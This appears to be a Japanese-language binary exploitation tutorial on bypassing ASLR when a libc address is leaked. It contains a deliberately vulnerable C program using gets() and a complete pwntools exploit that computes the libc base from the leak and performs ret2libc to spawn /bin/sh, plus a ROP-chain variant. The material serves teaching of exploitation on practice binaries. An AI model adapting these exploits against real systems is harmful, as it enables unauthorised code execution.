# リークが与えられた場合の ASLR バイパス

## ソース

{% file src="../../../.gitbook/assets/aslr.zip" caption="ASLR - 32-bit" %}

```c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buffer[20];

    printf("System is at: %lp\n", system);

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

PIE のときと同じですが、今回は system のアドレスを出力します。

## 解析

```text
$ ./vuln-32 
System is at: 0xf7de5f00
```

はい、期待どおりの動作です。

{% hint style="info" %}
system のアドレスは、末尾の文字が異なる場合があります。これは libc のバージョンが違うだけです。
{% endhint %}

## エクスプロイト

大部分は PIE のときと同じです。

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```

ここで libc を読み込んでいる点に注目してください。これは単なるもうひとつの `ELF` オブジェクトで、作業を楽にしてくれます。

system のアドレスをパースし、そこから libc のベースを計算します(PIE のときと同様です)。

```python
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')
```

これでようやく ret2libc ができます。`libc` の `ELF` オブジェクトを使えば、とても簡単に書けます。

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

### 最終的なエクスプロイト

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

## 64 ビット

自分で試してみてください :)

{% file src="../../../.gitbook/assets/aslr-64.zip" caption="ASLR - 64-bit" %}

## pwntools を使う

お好みで、次のペイロードをもっと pwntools らしく書くこともできます。

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
```

代わりに、次のように書けます。

```python
binsh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

p.sendline(rop.chain())
```

この書き方の利点は、(おそらく)読みやすいことに加えて、パラメータがすべて自動的に解決されるため、64 ビットのエクスプロイトでも再利用しやすいことです。

